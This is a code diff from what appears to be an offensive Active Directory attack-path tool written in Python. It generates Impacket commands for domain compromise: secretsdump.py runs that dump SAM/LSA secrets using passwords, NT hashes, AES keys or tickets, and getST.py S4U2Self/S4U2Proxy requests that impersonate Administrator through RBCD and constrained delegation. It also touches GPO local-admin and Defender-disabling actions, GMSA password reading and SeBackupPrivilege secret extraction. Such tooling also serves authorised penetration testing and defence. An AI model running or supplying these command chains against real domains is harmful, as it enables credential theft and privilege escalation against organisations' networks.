@@ -35,6 +35,34 @@ class Action():
         pass
 
 
+class x__TransformPasswordToAES(Action):
+    def print(previous_action:str, glob:dict, parent:Owned, target:LDAPObject, require:dict):
+        v = vars(glob, parent, target,
+                plain=f'{Fore.RED}PLAIN_PASSWORD_HEX{Style.RESET_ALL}')
+        comment = "Get the AES key from the password for more convenience"
+        cmd = "./tools/aesKrbKeyGen.py '{fqdn}/{target.name}:{plain}'"
+        print_line(comment, cmd, v)
+
+
+class  x__Secretsdump(Action):
+    def print(previous_action:str, glob:dict, parent:Owned, target:LDAPObject, require:dict):
+        v = vars(glob, parent, target,
+                    plain=f'{Fore.RED}PLAIN_PASSWORD_HEX{Style.RESET_ALL}')
+
+        comment = "Dump the SAM and LSA cache on {target.name} to get the plain_password_hex"
+
+        if parent.krb_auth:
+            cmd = "secretsdump.py '{target_no_dollar}' -k -no-pass -dc-ip {dc_ip} -target-ip {target_ip}"
+        elif parent.secret_type == c.SECRET_NTHASH:
+            cmd = "secretsdump.py '{fqdn}/{parent.obj.name}@{target_no_dollar}' -hashes :{parent.secret} -dc-ip {dc_ip} -target-ip {target_ip}"
+        elif parent.secret_type == c.SECRET_AESKEY:
+            cmd = "secretsdump.py '{fqdn}/{parent.obj.name}@{target_no_dollar}' -k -no-pass -aesKey {parent.secret} -dc-ip {dc_ip} -target-ip {target_ip}"
+        elif parent.secret_type == c.SECRET_PASSWORD:
+            cmd = "secretsdump.py '{fqdn}/{parent.obj.name}:{parent.secret}@{target_no_dollar}' -dc-ip {dc_ip} -target-ip {target_ip}"
+
+        print_line(comment, cmd, v)
+
+
 class x_ForceChangePassword(Action):
     def print(previous_action:str, glob:dict, parent:Owned, target:LDAPObject, require:dict):
         v = vars(glob, parent, target)
@@ -517,8 +545,10 @@ class x_RBCD(Action):
 
 class x_AllowedToAct(Action):
     def print(previous_action:str, glob:dict, parent:Owned, target:LDAPObject, require:dict):
-        GetSTImpersonate(glob, parent, target, previous_action == '::U2U')
-        Secretsdump(glob, parent, target)
+        target_no_dollar = target.name.replace('$', '')
+        GetSTImpersonate(glob, parent,
+            requested_spn=f'HOST/{target_no_dollar}',
+            do_u2u=previous_action == '::U2U')
 
 
 # RBCD U2U
@@ -571,8 +601,13 @@ class x_SelfRBCD(Action):
         print_comment('Self-RBCD')
 
         x_RBCD.print(previous_action, glob, parent, parent.obj, require)
-        GetSTImpersonate(glob, require['object'], parent.obj, do_u2u=False)
 
+        target_no_dollar = parent.obj.name.replace('$', '')
+        GetSTImpersonate(glob, require['object'],
+            requested_spn=f'HOST/{target_no_dollar}',
+            do_u2u=False)
+
+        # Save the ticket for AllowedToDelegate (-additional-ticket)
         print_cmd('ticket="$KRB5CCNAME"')
         print()
 
@@ -583,48 +618,23 @@ class x_AllowedToDelegate(Action):
         # take arbitrary the first spn
         requested_spn = parent.obj.rights_by_sid[target.sid]['AllowedToDelegate'][0]
 
-        v = vars(glob, parent, target,
-                requested_spn=requested_spn,
-                plain=f'{Fore.RED}PLAIN_PASSWORD_HEX{Style.RESET_ALL}')
+        v = vars(glob, parent, target)
 
         contains_fqdn = requested_spn.upper().endswith(v['fqdn'].upper())
 
         if previous_action == '::SelfRBCD':
-            v['do_additional'] = ' -additional-ticket "$ticket"'
+            do_additional = ' -additional-ticket "$ticket"'
         else:
-            v['do_additional'] = ''
+            do_additional = ''
             print_comment('Constrained delegation with protocol transition (TRUSTED_TO_AUTH_FOR_DELEGATION)')
 
-        comment = 'Ask a TGS on {target.name} and impersonate it to Administrator (S4U2Self + S4U2Proxy)'
+        target_no_dollar = target.name.replace('$', '')
+        GetSTImpersonate(glob, parent,
+            requested_spn=requested_spn,
+            do_u2u=False,
+            do_additional=do_additional)
 
-        if parent.krb_auth:
-            cmd = "getST.py '{fqdn}/{parent.obj.name}' -no-pass -dc-ip {dc_ip} -impersonate Administrator -spn '{requested_spn}'{do_additional}"
-        elif parent.secret_type == c.SECRET_NTHASH:
-            cmd = "getST.py '{fqdn}/{parent.obj.name}' -hashes :{parent.secret} -dc-ip {dc_ip} -impersonate Administrator -spn '{requested_spn}'{do_additional}"
-        elif parent.secret_type == c.SECRET_AESKEY:
-            cmd = "getST.py '{fqdn}/{parent.obj.name}' -no-pass -aesKey {parent.secret} -dc-ip {dc_ip} -impersonate Administrator -spn '{requested_spn}'{do_additional}"
-        elif parent.secret_type == c.SECRET_PASSWORD:
-            cmd = "getST.py '{fqdn}/{parent.obj.name}:{parent.secret}' -dc-ip {dc_ip} -impersonate Administrator -spn '{requested_spn}'{do_additional}"
-
-        print_line(comment, cmd, v, end=False)
-
-
-        v['requested_spn'] = v['requested_spn'].replace('/', '_')
-        print_cmd("export KRB5CCNAME='Administrator@{requested_spn}@{fqdn}.ccache'", v)
-        print()
-
-        comment = 'Dump the SAM and LSA cache on {target.name} to get the plain_password_hex'
-
-        if contains_fqdn:
-            cmd = "secretsdump.py '{target_no_dollar}.{fqdn}' -k -no-pass -dc-ip {dc_ip} -target-ip '{target_ip}'"
-        else:
-            cmd = "secretsdump.py '{target_no_dollar}' -k -no-pass -dc-ip {dc_ip} -target-ip '{target_ip}'"
-
-        print_line(comment, cmd, v)
-
-        comment = "Get the AES key from the password for more convenience"
-        cmd = "./tools/aesKrbKeyGen.py '{fqdn}/{target.name}:{plain}'"
-        print_line(comment, cmd, v)
+        parent.krb_need_fqdn = contains_fqdn
 
 
 class x_ReadLAPSPassword(Action):
@@ -662,6 +672,8 @@ class x_ReadGMSAPassword(Action):
             'a legitimate event if you request the password from the same context as a computer',
             'account that is already authorized to read the GMSA password.',
         ]
+
+        # The script returns hashes
 
         if parent.krb_auth:
             cmd = "./tools/readgmsa.py '{fqdn}/{parent.obj.name}@{dc_name}' -use-ldaps -dc-ip {dc_ip} -k"
@@ -887,8 +899,6 @@ class x_GPOAddLocalAdmin(Action):
 
         post_update_gpo(v, parent, target, gpo, '[{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]')
 
-        Secretsdump(glob, parent, target)
-
 
 class x_GPODisableDefender(Action):
     def print(previous_action:str, glob:dict, parent:Owned, target:LDAPObject, require:dict):
@@ -1079,10 +1089,6 @@ class x_SeBackupPrivilege(Action):
 
         comment = "Extract secrets"
         cmd = "secretsdump.py -sam SAM.save -security SECURITY.save -system SYSTEM.save local"
-        print_line(comment, cmd, v)
-
-        comment = 'Get the AES key from the password for more convenience'
-        cmd = "./tools/aesKrbKeyGen.py '{fqdn}/{target.name}:{plain}'"
         print_line(comment, cmd, v)
 
 
